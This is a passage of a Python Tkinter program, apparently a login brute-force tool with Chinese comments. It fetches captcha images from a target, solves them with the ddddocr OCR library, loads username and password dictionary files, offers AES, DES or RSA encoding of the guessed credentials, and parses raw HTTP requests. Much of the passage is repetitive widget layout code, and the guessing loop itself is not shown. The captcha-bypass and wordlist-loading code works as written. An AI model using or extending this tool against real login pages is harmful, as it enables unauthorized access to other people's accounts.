							self.respon.insert(tk.INSERT,"[+] 成功获取其他参数：{}".format(temp))
						#保存图码
						self.writefile(base64.b64decode(imgData))

				elif method=="POST":
					if self.Entry1.get() == "general":
						if self.Entry18.get() == "timestamp":
							re = requests.post(url=codeUrl+str(int(round(time.time() * 1000))),data=postData,headers=headers,proxies=proxies,timeout=3,verify=False)
						elif self.Entry18.get() == "randomNum":
							re = requests.post(url=codeUrl+str(random.random()),data=postData,headers=headers,proxies=proxies,timeout=3,verify=False)
						elif self.Entry18.get()=="None":
							re = requests.post(url=codeUrl,data=postData,headers=headers,proxies=proxies,verify=False,timeout=3)
						ocr = ddddocr.DdddOcr(use_gpu=True,device_id=1)
						code = ocr.classification(re.content)
						self.respon1.pack_forget()
						self.respon.pack(side=LEFT, fill=BOTH)
						self.respon.delete("1.0","end")
						self.respon.insert(tk.INSERT,"[+] 成功识别图形码：{}\n[+] 可对比./test.png图片来验证识别结果".format(code))
						self.writefile(re.content)
					elif self.Entry1.get() == "json":
						imgParam = self.Entry2.get().strip("\n")
						if self.Entry18.get() == "timestamp":
							re = requests.post(url=codeUrl+str(int(round(time.time() * 1000))),data=postData,headers=headers,verify=False,proxies=proxies,timeout=3)
						elif self.Entry18.get() == "randomNum":
							re = requests.post(url=codeUrl+str(random.random()),headers=headers,proxies=proxies,verify=False,timeout=3)
						elif self.Entry18.get()=="None":
							re = requests.post(url=codeUrl,data=postData,headers=headers,proxies=proxies,verify=False,timeout=3)
						imgB64Data = re.json()[imgParam]
						if "base64" in imgB64Data:
							imgB64Data = imgB64Data.split(",")[1]
						imgData = bytes(imgB64Data,encoding="utf8")
						# imgB64Data = bytes(re.json()[imgParam],encoding="utf8")
						ocr = ddddocr.DdddOcr(use_gpu=True,device_id=1)
						code = ocr.classification(base64.b64decode(imgData))
						if self.Entry3.get().strip("\n")=="":
							self.respon.pack(side=LEFT, fill=BOTH)
							self.respon1.pack_forget()
							self.respon.delete("1.0","end")
							self.respon.insert(tk.INSERT,"[+] 成功识别图形码：{}\n[+] 可对比./test.png图片来验证识别结果".format(code))
						else:
							temp = []
							otherParams = self.Entry3.get().strip("\n").replace(" ","").split(",")
							for otherParam in otherParams:
								temp.append(re.json()[otherParam])
							self.respon.pack(side=LEFT, fill=BOTH)
							self.respon1.pack_forget()
							self.respon.delete("1.0","end")
							self.respon.insert(tk.INSERT,"[+] 成功识别图形码：{}\n[+] 可对比./test.png图片来验证识别结果\n".format(code))
							self.respon.insert(tk.INSERT,"[+] 成功获取其他参数：{}".format(temp))
						#保存图码
						self.writefile(base64.b64decode(imgData))
		except Exception as e:
			self.respon1.pack_forget()
			self.respon.pack(side=LEFT, fill=BOTH)
			self.respon.insert(tk.INSERT,"[!] 识别图形码失败！\n")
			self.respon.insert(tk.INSERT,f"[!] Error:{e}")

	#add users+password
	def addUsers(self):
		usernamefile = askopenfilename(title="select user dict",filetypes=[("TXT","*.txt")])
		fileName = usernamefile.split("/")[-1]
		if usernamefile:
			# self.Entry3Text.set(fileName)
			userNames = self.readfile(usernamefile)
			for userName in userNames:
				self.Entry10.insert(tk.INSERT,userName+"\n")

	def addPass(self):
		passwdfile = askopenfilename(title="select passwd dict",filetypes=[("TXT","*.txt")])
		fileName = passwdfile.split("/")[-1]
		if passwdfile:
			# self.Entry4Text.set(fileName)
			passWDs = self.readfile(passwdfile)
			for passwd in passWDs:
				self.Entry11.insert(tk.INSERT,passwd+"\n")

	#read file
	def readfile(self,filename):
		datas = []
		with open(filename,"r") as f:
			line = f.readline()
			while line:
				datas.append(line.strip("\n"))
				line = f.readline()
		return datas

	#save gcode
	def writefile(self,content):
	    pathdir = 'test.png'
	    with open(pathdir, 'wb') as f:
	            f.write(content)

	#select crypt method
	def selectUserCrypt(self,event):
		if self.Entry13.get() == "AES_CBC":
			self.label19.pack(side=LEFT)
			self.Entry19.pack(side=LEFT)
			if self.Entry12.get() == "AES_ECB":
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry12.get() == "DES":
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid(row=3,column=0)
				self.Entry17.grid(row=3,column=1)
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry12.get() == "RSA":
				self.label16.grid(row=2,column=0)
				self.Entry16.grid(row=2,column=1)
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label20.pack(side=LEFT)
				self.Entry20.pack(side=LEFT)
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			else:
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()

		elif self.Entry13.get() == "AES_ECB":
			self.label19.pack(side=LEFT)
			self.Entry19.pack(side=LEFT)
			if self.Entry12.get() == "AES_CBC":
				self.label15.grid(row=1,column=0)
				self.Entry15.grid(row=1,column=1)
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry12.get() == "DES":
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid(row=3,column=0)
				self.Entry17.grid(row=3,column=1)
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry12.get() == "RSA":
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid(row=2,column=0)
				self.Entry16.grid(row=2,column=1)
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label20.pack(side=LEFT)
				self.Entry20.pack(side=LEFT)
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			else:
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()

		elif self.Entry13.get() == "RSA":
			self.label19.pack(side=LEFT)
			self.Entry19.pack(side=LEFT)
			if self.Entry12.get() == "AES_CBC":
				self.label14.grid(row=0,column=0)
				self.Entry14.grid(row=0,column=1)
				self.label15.grid(row=1,column=0)
				self.Entry15.grid(row=1,column=1)
				self.label17.grid_forget()
				self.Entry17.grid_forget()
			elif self.Entry12.get() == "AES_ECB":
				self.label14.grid(row=0,column=0)
				self.Entry14.grid(row=0,column=1)
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
			elif self.Entry12.get() == "DES":
				self.label14.grid_forget()
				self.Entry14.grid_forget()
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label17.grid(row=3,column=0)
				self.Entry17.grid(row=3,column=1)
			else:
				self.label14.grid_forget()
				self.Entry14.grid_forget()
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()

		elif self.Entry13.get() == "DES":
			self.label19.pack(side=LEFT)
			self.Entry19.pack(side=LEFT)
			if self.Entry12.get() == "AES_CBC":
				self.label14.grid(row=0,column=0)
				self.Entry14.grid(row=0,column=1)
				self.label15.grid(row=1,column=0)
				self.Entry15.grid(row=1,column=1)
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry12.get() == "AES_ECB":
				self.label14.grid(row=0,column=0)
				self.Entry14.grid(row=0,column=1)
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry12.get() == "RSA":
				self.label14.grid_forget()
				self.Entry14.grid_forget()
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid(row=1,column=0)
				self.Entry16.grid(row=1,column=1)
				self.label20.pack(side=LEFT)
				self.Entry20.pack(side=LEFT)
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			else:
				self.label14.grid_forget()
				self.Entry14.grid_forget()
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()

		else:
			if self.Entry12.get() == "AES_CBC":
				self.label14.grid(row=0,column=0)
				self.Entry14.grid(row=0,column=1)
				self.label15.grid(row=1,column=0)
				self.Entry15.grid(row=1,column=1)
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label19.pack(side=LEFT)
				self.Entry19.pack(side=LEFT)
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry12.get() == "AES_ECB":
				self.label14.grid(row=0,column=0)
				self.Entry14.grid(row=0,column=1)
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label19.pack(side=LEFT)
				self.Entry19.pack(side=LEFT)
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry12.get() == "RSA":
				self.label14.grid_forget()
				self.label15.grid_forget()
				self.Entry14.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid(row=2,column=0)
				self.Entry16.grid(row=2,column=1)
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label19.pack(side=LEFT)
				self.Entry19.pack(side=LEFT)
				self.label20.pack(side=LEFT)
				self.Entry20.pack(side=LEFT)

			elif self.Entry12.get() == "DES":
				self.label14.grid_forget()
				self.label15.grid_forget()
				self.Entry14.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid(row=3,column=0)
				self.Entry17.grid(row=3,column=1)
				self.label19.pack(side=LEFT)
				self.Entry19.pack(side=LEFT)
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			else:
				self.label14.grid_forget()
				self.label15.grid_forget()
				self.label16.grid_forget()
				self.label17.grid_forget()
				self.Entry14.grid_forget()
				self.Entry15.grid_forget()
				self.Entry16.grid_forget()
				self.Entry17.grid_forget()
				self.label19.pack_forget()
				self.Entry19.pack_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()

	def selectPassCrypt(self,event):
		if self.Entry12.get() == "AES_CBC":
			self.label19.pack(side=LEFT)
			self.Entry19.pack(side=LEFT)
			if self.Entry13.get() == "AES_EBC":
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry13.get() == "RSA":
				self.label16.grid(row=2,column=0)
				self.Entry16.grid(row=2,column=1)
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label20.pack(side=LEFT)
				self.Entry20.pack(side=LEFT)
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry13.get() == "DES":
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid(row=3,column=0)
				self.Entry17.grid(row=3,column=1)
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			else:
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()

		elif self.Entry12.get() == "AES_ECB":
			self.label19.pack(side=LEFT)
			self.Entry19.pack(side=LEFT)
			if self.Entry13.get() == "AES_CBC":
				self.label15.grid(row=1,column=0)
				self.Entry15.grid(row=1,column=1)
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry13.get() == "RSA":
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid(row=2,column=0)
				self.Entry16.grid(row=2,column=1)
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label20.pack(side=LEFT)
				self.Entry20.pack(side=LEFT)
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry13.get() == "DES":
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid(row=3,column=0)
				self.Entry17.grid(row=3,column=1)
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			else:
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()

		elif self.Entry12.get() == "RSA":
			self.label19.pack(side=LEFT)
			self.Entry19.pack(side=LEFT)
			if self.Entry13.get() == "AES_CBC":
				self.label14.grid(row=0,column=0)
				self.Entry14.grid(row=0,column=1)
				self.label15.grid(row=1,column=0)
				self.Entry15.grid(row=1,column=1)
				self.label17.grid_forget()
				self.Entry17.grid_forget()
			elif self.Entry13.get() == "AES_ECB":
				self.label14.grid(row=0,column=0)
				self.Entry14.grid(row=0,column=1)
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
			elif self.Entry13.get() == "DES":
				self.label14.grid_forget()
				self.Entry14.grid_forget()
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label17.grid(row=3,column=0)
				self.Entry17.grid(row=3,column=1)
			else:
				self.label14.grid_forget()
				self.Entry14.grid_forget()
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()

		elif self.Entry12.get() == "DES":
			self.label19.pack(side=LEFT)
			self.Entry19.pack(side=LEFT)
			if self.Entry13.get() == "AES_CBC":
				self.label14.grid(row=0,column=0)
				self.Entry14.grid(row=0,column=1)
				self.label15.grid(row=1,column=0)
				self.Entry15.grid(row=1,column=1)
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry13.get() == "AES_ECB":
				self.label14.grid(row=0,column=0)
				self.Entry14.grid(row=0,column=1)
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry13.get() == "RSA":
				self.label14.grid_forget()
				self.Entry14.grid_forget()
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid(row=2,column=0)
				self.Entry16.grid(row=2,column=1)
				self.label20.pack(side=LEFT)
				self.Entry20.pack(side=LEFT)
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			else:
				self.label14.grid_forget()
				self.Entry14.grid_forget()
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()

		else:
			if self.Entry13.get() == "AES_CBC":
				self.label14.grid(row=0,column=0)
				self.Entry14.grid(row=0,column=1)
				self.label15.grid(row=1,column=0)
				self.Entry15.grid(row=1,column=1)
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label19.pack(side=LEFT)
				self.Entry19.pack(side=LEFT)
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry13.get() == "AES_ECB":
				self.label14.grid(row=0,column=0)
				self.Entry14.grid(row=0,column=1)
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label19.pack(side=LEFT)
				self.Entry19.pack(side=LEFT)
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry13.get() == "RSA":
				self.label14.grid_forget()
				self.Entry14.grid_forget()
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid(row=2,column=0)
				self.Entry16.grid(row=2,column=1)
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label19.pack(side=LEFT)
				self.Entry19.pack(side=LEFT)
				self.label20.pack(side=LEFT)
				self.Entry20.pack(side=LEFT)
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			elif self.Entry13.get() == "DES":
				self.label14.grid_forget()
				self.Entry14.grid_forget()
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid(row=3,column=0)
				self.Entry17.grid(row=3,column=1)
				self.label19.pack(side=LEFT)
				self.Entry19.pack(side=LEFT)
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()
			else:
				self.label14.grid_forget()
				self.Entry14.grid_forget()
				self.label15.grid_forget()
				self.Entry15.grid_forget()
				self.label16.grid_forget()
				self.Entry16.grid_forget()
				self.label17.grid_forget()
				self.Entry17.grid_forget()
				self.label19.pack_forget()
				self.Entry19.pack_forget()
				self.label20.pack_forget()
				self.Entry20.pack_forget()
				self.label21.grid_forget()
				self.Entry21.grid_forget()
				self.label22.grid_forget()
				self.Entry22.grid_forget()

	#选择图形码模式
	def selectMode(self,event):
		if self.Entry1.get() == "general":
			self.label2.grid_forget()
			self.Entry2.grid_forget()
			self.label3.grid_forget()
			self.Entry3.grid_forget()
			self.Button1.grid_forget()
			self.Button2.grid_forget()

		if self.Entry1.get() == "json":
			self.label2.grid(row=2, column=0)
			self.Entry2.grid(row=2, column=1)
			self.Button1.grid(row=1,column=0)
			self.Button2.grid_forget()

	# add other paramers
	def addParams(self):
		if self.Entry1.get()=="json":
			self.label3.grid(row=3, column=0)
			self.Entry3.grid(row=3, column=1)
			self.Button1.grid_forget()
			self.Button2.grid(row=2,column=0)

	def clearParams(self):
		self.label3.grid_forget()
		self.Entry3.grid_forget()
		self.Entry3Text.set("")
		self.Button1.grid(row=1,column=0)
		self.Button2.grid_forget()

	#初始化工具条函数
	def init_toolbar(self):
		# 创建并添加一个Frame作为工具条的容器
		toolframe = Frame(self.windows, height=2, bg='lightgray')
		# 该Frame容器放在窗口顶部
		toolframe.pack(fill=X)

	#解析请求包
	def analysisRaw(self,RawData):
		headerData = RawData.split("\n\n")[0]
		headerList = headerData.split("\n")
		method = headerList[0].split(" ")[0]
		path = headerList[0].split(" ")[1]
		postData = ""
		del headerList[0]
		keys = []
		values = []
		for header in headerList:
			if header != "":
				index = header.strip().index(":")
				keys.append(header.strip()[:index])
				values.append(header.strip()[index+1:].strip())
		headers = dict(zip(keys,values))
		if "Cookie" in headers.keys():
			headers.pop("Cookie")
		if len(RawData.split("\n\n"))==2:
			postData = RawData.split("\n\n")[1]
		return method,path,headers,postData

	def analysisCodeRaw(self,RawData):
		headerData = RawData.split("\n\n")[0]
		headerList = headerData.split("\n")
		method = headerList[0].split(" ")[0]
		# path = headerList[0].split(" ")[1]
		postData = ""
		del headerList[0]
		keys = []
		values = []
		for header in headerList:
			if header != "":
				index = header.strip().index(":")
				keys.append(header.strip()[:index])
				values.append(header.strip()[index+1:].strip())
		headers = dict(zip(keys,values))
		if "Cookie" in headers.keys():
			headers.pop("Cookie")
		if len(RawData.split("\n\n"))==2:
			postData = RawData.split("\n\n")[1]
		return method,headers,postData

	#线程减缓页面卡死
	# @staticmethod
	def thread_it(self, func, *args):
		t = threading.Thread(target=func, args=args) 
		# 守护--就算主界面关闭，线程也会留守后台运行（不对!）
		t.setDaemon(True)
		# 启动
		t.start()

if __name__ == '__main__':
	windowGUI()